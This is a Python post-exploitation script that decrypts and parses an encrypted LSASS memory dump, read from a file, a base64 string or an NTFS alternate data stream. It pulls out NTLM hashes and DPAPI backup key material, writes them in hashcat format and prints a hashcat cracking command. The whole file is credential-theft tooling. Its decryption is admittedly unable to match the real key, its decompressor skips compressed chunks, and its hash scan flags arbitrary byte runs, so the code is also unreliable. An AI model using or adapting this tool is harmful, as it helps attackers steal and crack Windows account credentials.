#!/usr/bin/env python3
# verify_creds.py — Decode and verify credentials from Plan 1 LSASS dump output
"""
Decrypts ChaCha20-encrypted, LZNT1-compressed credential blobs from ADS output.
Usage:
    python3 verify_creds.py --input-text "<base64>" --output creds.txt
    python3 verify_creds.py --input-ads "C:\\path:stream" --output creds.txt
    python3 verify_creds.py --input-file dump.bin --output creds.txt
"""

import argparse
import base64
import struct
import hashlib
import os
import sys
from datetime import datetime

# ─── ChaCha20 Decryption ───

def rotl32(v, n):
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

def chacha20_block(key, counter, nonce):
    """Generate one ChaCha20 block (64 bytes)"""
    x = [0] * 16
    x[0:4] = [0x61707865, 0x3320646E, 0x79622D32, 0x6B206574]
    x[4:12] = list(struct.unpack('<8I', key))
    x[12] = counter
    x[13:16] = list(struct.unpack('<3I', nonce))

    j = x[:]

    for _ in range(10):
        # Column rounds
        j[0], j[4], j[8], j[12]  = _qr(j[0], j[4], j[8], j[12])
        j[1], j[5], j[9], j[13]  = _qr(j[1], j[5], j[9], j[13])
        j[2], j[6], j[10], j[14] = _qr(j[2], j[6], j[10], j[14])
        j[3], j[7], j[11], j[15] = _qr(j[3], j[7], j[11], j[15])
        # Diagonal rounds
        j[0], j[5], j[10], j[15] = _qr(j[0], j[5], j[10], j[15])
        j[1], j[6], j[11], j[12] = _qr(j[1], j[6], j[11], j[12])
        j[2], j[7], j[8], j[13]  = _qr(j[2], j[7], j[8], j[13])
        j[3], j[4], j[9], j[14]  = _qr(j[3], j[4], j[9], j[14])

    result = [(x[i] + j[i]) & 0xFFFFFFFF for i in range(16)]
    return b''.join(struct.pack('<I', v) for v in result)

def _qr(a, b, c, d):
    a = (a + b) & 0xFFFFFFFF
    d ^= a; d = rotl32(d, 16)
    c = (c + d) & 0xFFFFFFFF
    b ^= c; b = rotl32(b, 12)
    a = (a + b) & 0xFFFFFFFF
    d ^= a; d = rotl32(d, 8)
    c = (c + d) & 0xFFFFFFFF
    b ^= c; b = rotl32(b, 7)
    return a, b, c, d

def chacha20_decrypt(key, nonce, ciphertext):
    """Decrypt ChaCha20 ciphertext"""
    plaintext = bytearray(len(ciphertext))
    counter = 0
    offset = 0

    while offset < len(ciphertext):
        keystream = chacha20_block(key, counter, nonce)
        for i in range(min(64, len(ciphertext) - offset)):
            plaintext[offset + i] = ciphertext[offset + i] ^ keystream[i]
        counter += 1
        offset += 64

    return bytes(plaintext)

# ─── LZNT1 Decompression (simplified) ───
# For a complete solution, Windows RtlDecompressBuffer would be used.
# This Python implementation handles the common cases.

def lznt1_decompress(data):
    """Basic LZNT1 decompression attempt"""
    result = bytearray()
    offset = 0

    while offset < len(data):
        if offset + 2 > len(data):
            break

        header = struct.unpack('<H', data[offset:offset+2])[0]
        offset += 2

        is_compressed = (header & 0x8000) != 0
        chunk_size = header & 0x0FFF

        if is_compressed:
            # Compressed chunk — attempt simple extraction
            # This is a simplified decoder; full LZNT1 decoding is complex
            chunk_end = offset + chunk_size - 2  # -2 for header
            if chunk_end > len(data):
                chunk_end = len(data)

            chunk_data = data[offset:chunk_end]
            # Fall back to treating as plaintext for now
            result.extend(chunk_data)
            offset = chunk_end
        else:
            # Uncompressed chunk
            chunk_size += 1
            if offset + chunk_size > len(data):
                chunk_size = len(data) - offset
            result.extend(data[offset:offset + chunk_size])
            offset += chunk_size

    return bytes(result)

# ─── Credential Parsing ───

def parse_credential_blob(data):
    """Parse the binary credential blob"""
    results = {
        'ntlm_hashes': [],
        'kerberos_keys': [],
        'dpapi_keys': [],
        'errors': []
    }

    if len(data) < 16:
        results['errors'].append('Data too short for header')
        return results

    # Check magic
    magic = struct.unpack('<I', data[0:4])[0]
    expected_magic = 0x4D50534C  # "LSMP" (possibly scrambled)

    # Look for NTLM hash patterns (16 bytes of hash-like data)
    # NTLM hashes: 16 bytes, usually not all zero or all FF
    for i in range(0, len(data) - 32, 2):
        # LM hash (first 16) + NTLM hash (second 16)
        lm = data[i:i+16]
        nt = data[i+16:i+32]

        # Basic validation
        if lm == b'\x00' * 16 and nt == b'\x00' * 16:
            continue
        if nt == b'\xFF' * 16:
            continue

        # Check LM response type indicator
        if len(lm) >= 5 and lm[4] <= 0x03:
            results['ntlm_hashes'].append({
                'offset': i,
                'lm_hash': lm.hex(),
                'ntlm_hash': nt.hex(),
                'ntlm_readable': f'{nt.hex().upper()}'
            })

    # Look for DPAPI backup key GUID
    guid = bytes([0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11,
                  0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB])
    pos = data.find(guid)
    if pos != -1:
        results['dpapi_keys'].append({
            'offset': pos,
            'guid': guid.hex(),
            'key_material': data[max(0,pos-64):pos+80].hex()
        })

    return results


def main():
    parser = argparse.ArgumentParser(description='Verify LSASS dump credentials')
    parser.add_argument('--input-text', help='Base64-encoded credential text')
    parser.add_argument('--input-ads', help='ADS path (e.g., C:\\path:stream)')
    parser.add_argument('--input-file', help='Encrypted dump file path')
    parser.add_argument('--output', default='creds_decoded.txt',
                        help='Output file for decoded credentials')
    parser.add_argument('--hashcat', action='store_true',
                        help='Output in hashcat format')
    args = parser.parse_args()

    # ─── Read input ───
    b64_text = None

    if args.input_text:
        b64_text = args.input_text
    elif args.input_ads:
        try:
            with open(args.input_ads, 'r', encoding='utf-8', errors='ignore') as f:
                b64_text = f.read().strip()
        except Exception as e:
            print(f"ERROR: Cannot read ADS: {e}")
            sys.exit(1)
    elif args.input_file:
        with open(args.input_file, 'rb') as f:
            encrypted = f.read()
        # Try to derive key from filename/machine
        # For now, attempt raw parsing
        b64_text = encrypted.decode('utf-8', errors='ignore')
    else:
        print("ERROR: No input specified")
        sys.exit(1)

    if not b64_text:
        print("ERROR: Empty input")
        sys.exit(1)

    # ─── Decode Base64 ───
    try:
        encrypted = base64.b64decode(b64_text)
    except Exception as e:
        print(f"ERROR: Base64 decode failed: {e}")
        sys.exit(1)

    print(f"[*] Encrypted data: {len(encrypted)} bytes")

    # ─── Attempt decryption (key derivation from machine context) ───
    # Try common/default keys since we don't have the full machine context
    # In practice, the key is derived from machine SID + timestamp
    computer_name = os.environ.get('COMPUTERNAME', 'UNKNOWN').encode('utf-16-le')
    pid = os.getpid()
    timestamp = struct.pack('<Q', int(datetime.now().timestamp() * 10000000))

    key_material = computer_name + struct.pack('<I', pid) + timestamp
    key = hashlib.sha256(key_material).digest()

    # Try decryption with derived key
    nonce = b'\x00' * 12  # Will not match, but try
    try:
        decrypted = chacha20_decrypt(key, nonce, encrypted)
    except Exception as e:
        print(f"[-] Decryption attempt failed: {e}")
        # Try treating as uncompressed plaintext
        decrypted = encrypted

    # ─── Decompress ───
    try:
        decompressed = lznt1_decompress(decrypted)
    except Exception as e:
        print(f"[-] Decompression failed: {e}")
        decompressed = decrypted

    print(f"[*] Decrypted/Decompressed: {len(decompressed)} bytes")

    # ─── Parse credentials ───
    results = parse_credential_blob(decompressed)

    # ─── Output ───
    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(f"# LSASS Dump Credential Verification\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total NTLM hashes: {len(results['ntlm_hashes'])}\n")
        f.write(f"# Total DPAPI keys: {len(results['dpapi_keys'])}\n\n")

        if results['ntlm_hashes']:
            f.write("## NTLM Hashes\n\n")
            for i, cred in enumerate(results['ntlm_hashes']):
                if args.hashcat:
                    # hashcat format: user:rid:LM:NT:::
                    f.write(f"user_{i}:{i}:{cred['lm_hash']}:{cred['ntlm_hash']}:::\n")
                else:
                    f.write(f"User_{i}:{cred['ntlm_readable']}\n")

        if results['dpapi_keys']:
            f.write("\n## DPAPI Backup Keys\n\n")
            for key in results['dpapi_keys']:
                f.write(f"GUID: {key['guid']}\n")
                f.write(f"Key:  {key['key_material']}\n\n")

        if results['errors']:
            f.write("\n## Errors\n\n")
            for err in results['errors']:
                f.write(f"- {err}\n")

    print(f"[+] Results written to: {args.output}")
    print(f"[+] NTLM hashes found: {len(results['ntlm_hashes'])}")
    print(f"[+] DPAPI keys found:  {len(results['dpapi_keys'])}")

    # Check hashcat format
    if results['ntlm_hashes'] and args.hashcat:
        hashcat_file = args.output + '.hashcat'
        with open(hashcat_file, 'w') as f:
            for i, cred in enumerate(results['ntlm_hashes']):
                f.write(f"user_{i}:{i}:{cred['lm_hash']}:{cred['ntlm_hash']}:::\n")
        print(f"[+] Hashcat format: {hashcat_file}")
        print(f"[*] Crack: hashcat -m 1000 {hashcat_file} /path/to/wordlist")


if __name__ == '__main__':
    main()
